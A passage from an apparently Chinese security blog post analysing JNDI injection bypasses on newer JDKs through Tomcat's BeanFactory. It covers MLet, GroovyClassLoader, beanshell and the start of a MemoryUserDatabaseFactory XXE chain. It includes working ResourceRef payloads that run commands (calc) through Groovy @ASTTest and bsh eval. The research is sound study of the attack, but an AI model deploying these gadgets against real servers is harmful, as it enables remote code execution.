<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">			<span class="comment">//从引用对象中获取所有的属性</span></span><br><span class="line">              Enumeration e = ref.getAll();</span><br><span class="line">		<span class="comment">//遍历属性</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                <span class="keyword">do</span> &#123;</span><br><span class="line">                                    <span class="keyword">do</span> &#123;</span><br><span class="line">                                        <span class="keyword">do</span> &#123;</span><br><span class="line">                                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                                <span class="keyword">if</span> (!e.hasMoreElements()) &#123;</span><br><span class="line">                                                    <span class="keyword">return</span> bean;</span><br><span class="line">                                                &#125;</span><br><span class="line">	·											<span class="comment">//获取属性</span></span><br><span class="line">                                                ra = (RefAddr)e.nextElement();</span><br><span class="line">                                                <span class="comment">//获取propName</span></span><br><span class="line">                                                propName = ra.getType();</span><br><span class="line">                       <span class="comment">//如果propName是下面的值则跳过</span></span><br><span class="line">                                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;factory&quot;</span>));</span><br><span class="line">                                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;scope&quot;</span>));</span><br><span class="line">                                    &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;auth&quot;</span>));</span><br><span class="line">                                &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;forceString&quot;</span>));</span><br><span class="line">                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;singleton&quot;</span>));</span><br><span class="line">						<span class="comment">//获取属性中的内容</span></span><br><span class="line">                            value = (String)ra.getContent();</span><br><span class="line">                            Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">                            <span class="comment">//根据propName从map中获取method</span></span><br><span class="line">                            Method method = (Method)forced.get(propName);</span><br><span class="line">                            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="comment">//将属性中的内容赋给valueArray</span></span><br><span class="line">                                valueArray[<span class="number">0</span>] = value;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="comment">//反射调用方法</span></span><br><span class="line">                                    method.invoke(bean, valueArray);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> NamingException(<span class="string">&quot;Forced String setter &quot;</span> + method.getName() + <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure>

<p>​    所以通过上面的分析发现其实在<code>BeanFactory</code>中其实可以调用多个方法，但是这些方法必须都在同一个Class中。并且<strong>由于在这个过程中Class只被实例化了一次，因此可以通过调用不同的方法为Class的属性赋值</strong>。</p>
<p>​    下来再看这个poc就可以理解为什么可以这么构造了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.management.loading.MLet&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">              <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">	<span class="comment">//指定要调用的方法名</span></span><br><span class="line">          ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;b=addURL,c=loadClass&quot;</span>));</span><br><span class="line">	<span class="comment">//为不同的方法的参数赋值</span></span><br><span class="line">          ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;http://127.0.0.1:2333/&quot;</span>));</span><br><span class="line">          ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;Blue&quot;</span>));</span><br><span class="line">          <span class="keyword">return</span> ref;</span><br></pre></td></tr></table></figure>

<h2 id="失败的UrlClassLoader调用链挖掘尝试"><a href="#失败的UrlClassLoader调用链挖掘尝试" class="headerlink" title="失败的UrlClassLoader调用链挖掘尝试"></a>失败的UrlClassLoader调用链挖掘尝试</h2><p>​    通过<code>Mlet</code>的加载虽然不能利用，但是我们也可以学习到<code>浅蓝</code>师傅挖掘调用链的思路，即通过UrlClassLoader的实现类寻找可以加载远程类的代码。</p>
<p>​    我们也可以尝试去挖掘对UrlClassLoader的调用，相关的调用需要满足以下条件：</p>
<ul>
<li>存在public构造方法</li>
<li>继承UrlClassLoader并调用了loadClass方法</li>
</ul>
<p><code>WebappClassLoaderBase</code>似乎满足条件，虽然这个类本身没有public构造方法，但是其子类<code>WebappClassLoader</code>是有无参构造方法的。但是由于<code>WebappClassLoaderBase</code>的<code>addURL</code>方法不是public类型的，所以无法利用。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220117231654295.png" alt="image-20220117231654295"></p>
<p><code>org.codehaus.plexus.compiler.javac.IsolatedClassLoader</code>满足上面的条件，但是addURL方法的参数不是String类型，所以也无法利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IsolatedClassLoader</span> <span class="keyword">extends</span> <span class="title">URLClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IsolatedClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="keyword">new</span> URL[<span class="number">0</span>], (ClassLoader)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addURL</span><span class="params">(URL url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.addURL(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Class&lt;?&gt; loadClass(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; c = <span class="keyword">this</span>.findLoadedClass(className);</span><br><span class="line">        ClassNotFoundException ex = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = <span class="keyword">this</span>.findClass(className);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">                ex = var5;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.parentClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = <span class="keyword">this</span>.parentClassLoader.loadClass(className);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    所以似乎没有其他可以直接利用的ClassLoader了。</p>
<h2 id="GroovyClassLoader执行命令分析"><a href="#GroovyClassLoader执行命令分析" class="headerlink" title="GroovyClassLoader执行命令分析"></a>GroovyClassLoader执行命令分析</h2><p>​    那么为什么<code>GroovyClassLoader</code>可以加载远程的class并执行里面的内容呢？</p>
<p>​    首先在<code>addClasspath</code>中会将我们传入的path转换为URI并添加到当前的<code>GroovyClassLoader</code>对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addClasspath</span><span class="params">(<span class="keyword">final</span> String path)</span> </span>&#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    URI newURI;</span><br><span class="line">                   <span class="comment">//正则匹配\p&#123;Alpha&#125;[-+.\p&#123;Alnum&#125;]*:[^\\]*,如果我们传入的是http的url是不会被匹配到的</span></span><br><span class="line">                    <span class="keyword">if</span> (!GroovyClassLoader.URI_PATTERN.matcher(path).matches()) &#123;</span><br><span class="line">                        newURI = (<span class="keyword">new</span> File(path)).toURI();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="comment">//根据传入的path构建url对象</span></span><br><span class="line">                        newURI = <span class="keyword">new</span> URI(path);</span><br><span class="line">                    &#125;</span><br><span class="line">					<span class="comment">//获取GroovyClassLoader中保存的url</span></span><br><span class="line">                    URL[] urls = GroovyClassLoader.<span class="keyword">this</span>.getURLs();</span><br><span class="line">                    URL[] arr$ = urls;</span><br><span class="line">                    <span class="keyword">int</span> len$ = urls.length;</span><br><span class="line">					<span class="comment">//判断newURI是否在url列表中</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                        URL url = arr$[i$];</span><br><span class="line">                        <span class="keyword">if</span> (newURI.equals(url.toURI())) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">				<span class="comment">//将url添加到GroovyClassLoader对象中</span></span><br><span class="line">                    GroovyClassLoader.<span class="keyword">this</span>.addURL(newURI.toURL());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (MalformedURLException var7) &#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (URISyntaxException var8) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>GroovyClassLoader#loadClass</code>首先通过UrlClassLoader根据我们传入的名称加载远程的Class，加载失败后则根据名称加载groovy，加载成功后会对远程加载的groovy代码编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String name, <span class="keyword">boolean</span> lookupScriptFiles, <span class="keyword">boolean</span> preferClassOverScript, <span class="keyword">boolean</span> resolve)</span> <span class="keyword">throws</span> ClassNotFoundException, CompilationFailedException </span>&#123;</span><br><span class="line">        Class cls = <span class="keyword">this</span>.getClassCacheEntry(name);</span><br><span class="line">        <span class="keyword">boolean</span> recompile = <span class="keyword">this</span>.isRecompilable(cls);</span><br><span class="line">        <span class="keyword">if</span> (!recompile) &#123;</span><br><span class="line">            <span class="keyword">return</span> cls;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ClassNotFoundException last = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//首先通过UrlClassLoader加载类加载成功则返回，失败则继续执行</span></span><br><span class="line">                Class parentClassLoaderClass = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">                <span class="keyword">if</span> (cls != parentClassLoaderClass) &#123;</span><br><span class="line">                    <span class="keyword">return</span> parentClassLoaderClass;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var19) &#123;</span><br><span class="line">                last = var19;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoClassDefFoundError var20) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var20.getMessage().indexOf(<span class="string">&quot;wrong name&quot;</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                last = <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SecurityManager sm = System.getSecurityManager();</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">                String className = name.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                <span class="keyword">int</span> i = className.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">                <span class="keyword">if</span> (i != -<span class="number">1</span> &amp;&amp; !className.startsWith(<span class="string">&quot;sun.reflect.&quot;</span>)) &#123;</span><br><span class="line">                    sm.checkPackageAccess(className.substring(<span class="number">0</span>, i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls != <span class="keyword">null</span> &amp;&amp; preferClassOverScript) &#123;</span><br><span class="line">                <span class="keyword">return</span> cls;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (lookupScriptFiles) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//从缓存中先获取Class</span></span><br><span class="line">                        Class classCacheEntry = <span class="keyword">this</span>.getClassCacheEntry(name);</span><br><span class="line">                        <span class="keyword">if</span> (classCacheEntry != cls) &#123;</span><br><span class="line">                            Class var24 = classCacheEntry;</span><br><span class="line">                            <span class="keyword">return</span> var24;</span><br><span class="line">                        &#125;</span><br><span class="line">				<span class="comment">//根据名称获取远程groovy的url</span></span><br><span class="line">                        URL source = <span class="keyword">this</span>.resourceLoader.loadGroovySource(name);</span><br><span class="line">                        Class oldClass = cls;</span><br><span class="line">                        cls = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="comment">//编译groovy代码</span></span><br><span class="line">                        cls = <span class="keyword">this</span>.recompile(source, name, oldClass);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220118130235474.png" alt="image-20220118130235474"></p>
<p>​        在<code>recompile</code>中判断URL是否是文件类型，如果不是则加载远程url中指定的groovy并进行parse。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Class <span class="title">recompile</span><span class="params">(URL source, String className, Class oldClass)</span> <span class="keyword">throws</span> CompilationFailedException, IOException </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (source == <span class="keyword">null</span> || (oldClass == <span class="keyword">null</span> || !<span class="keyword">this</span>.isSourceNewer(source, oldClass)) &amp;&amp; oldClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> oldClass;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">synchronized</span>(<span class="keyword">this</span>.sourceCache) &#123;</span><br><span class="line">             String name = source.toExternalForm();</span><br><span class="line">             <span class="keyword">this</span>.sourceCache.remove(name);</span><br><span class="line">             <span class="comment">//判断是否为本地file</span></span><br><span class="line">             <span class="keyword">if</span> (<span class="keyword">this</span>.isFile(source)) &#123;</span><br><span class="line">                 Class var10000;</span><br><span class="line">                 <span class="keyword">try</span> &#123;</span><br><span class="line">                     var10000 = <span class="keyword">this</span>.parseClass(<span class="keyword">new</span> GroovyCodeSource(<span class="keyword">new</span> File(source.toURI()), <span class="keyword">this</span>.config.getSourceEncoding()));</span><br><span class="line">                 &#125; <span class="keyword">catch</span> (URISyntaxException var8) &#123;</span><br><span class="line">                     <span class="keyword">return</span> <span class="keyword">this</span>.parseClass(source.openStream(), name);</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">return</span> var10000;</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="comment">//加载url中指定的groovy</span></span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">this</span>.parseClass(source.openStream(), name);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>​    而在parseClass的过程中会执行<code>@ASTTest</code>中的代码，因此可以命令执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;<span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)&#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>​    在查找资料的过程中，发现<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Welk1n/p/11066397.html">浅析JNDI注入Bypass</a>中也提到了Groovy的绕过利用,可以看到这里其实可以直接调用<code>GroovyClassLoader#parseClass</code>并传入我们构造好的内容执行命令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"> ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line"> String script = <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">     <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)\n&quot;</span> +</span><br><span class="line">     <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">     <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line"> ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>,script));</span><br></pre></td></tr></table></figure>

<h2 id="命令执行利用链挖掘"><a href="#命令执行利用链挖掘" class="headerlink" title="命令执行利用链挖掘"></a>命令执行利用链挖掘</h2><p>​    除了寻找UrlClassLoader加载远程类外，还有一个思路是寻找可以执行命令的点，那么为什么<code>ScriptEngine</code>作为JDK自带的可以执行命令的方式不行呢？</p>
<p>​    因为通过<code>ScriptEngine</code>来执行命令，都需要两个参数，所以不能通过ScriptEngine调用执行命令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">eval</span><span class="params">(String script, Bindings bindings)</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ScriptContext ctxt = getScriptContext(bindings);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eval(script , ctxt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">eval</span><span class="params">(Reader reader, ScriptContext ctxt)</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.evalImpl(makeSource(reader, ctxt), ctxt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    尝试通过CodeQL找下<code>NashornScriptEngine#eval</code>的调用，确实也没有参数为string类型的调用，所以从原生的JDK中应该是找不到命令执行的点了。</p>
<p>​    除了上面列出的执行命令的方式外，<code>beanshell</code>也可以执行命令，并且满足我们的条件，因此也可以使用beanshell的利用方式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;bsh.Interpreter&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;exec(\&quot;cmd.exe /c calc.exe\&quot;)&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> ref;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220118173357303.png" alt="image-20220118173357303"></p>
<h2 id="MemoryUserDatabaseFactory利用链"><a href="#MemoryUserDatabaseFactory利用链" class="headerlink" title="MemoryUserDatabaseFactory利用链"></a>MemoryUserDatabaseFactory利用链</h2><p>​    上面的分析都是建立在Tomcat下的BeanFactory的利用下的，我们也可以寻找其他实现了ObjectFactory的类利用，浅蓝师傅找到的<code>MemoryUserDatabaseFactory</code>利用过程比较精彩，这里着重分析一下。</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>​        <code>MemoryUserDatabaseFactory#getObjectInstance</code>首先创建一个<code>MemoryUserDatabase</code>对象，首先看下tomcat对这个对象的解释,和tomcat的用户有关，tomcat会将这个对象中的内容存储到xml中。</p>
<blockquote>
<p>UserDatabase的具体实现，它将所有已定义的用户、组和角色加载到内存中的数据结构中，并使用指定的XML文件进行持久存储。</p>
</blockquote>
<p>​        创建<code>MemoryUserDatabase</code>后会从我们传入的引用对象中获取<code>pathname</code>、<code>database</code>、<code>readonly</code>并设置到新建的<code>MemoryUserDatabase</code>对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp; obj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">          Reference ref = (Reference)obj;</span><br><span class="line">          <span class="comment">//判断class是否是org.apache.catalina.UserDatabase</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              MemoryUserDatabase database = <span class="keyword">new</span> MemoryUserDatabase(name.toString());</span><br><span class="line">              RefAddr ra = <span class="keyword">null</span>;</span><br><span class="line">              <span class="comment">//从引用对象中获取pathname属性</span></span><br><span class="line">              ra = ref.get(<span class="string">&quot;pathname&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="comment">//给database设置属性</span></span><br><span class="line">                  database.setPathname(ra.getContent().toString());</span><br><span class="line">              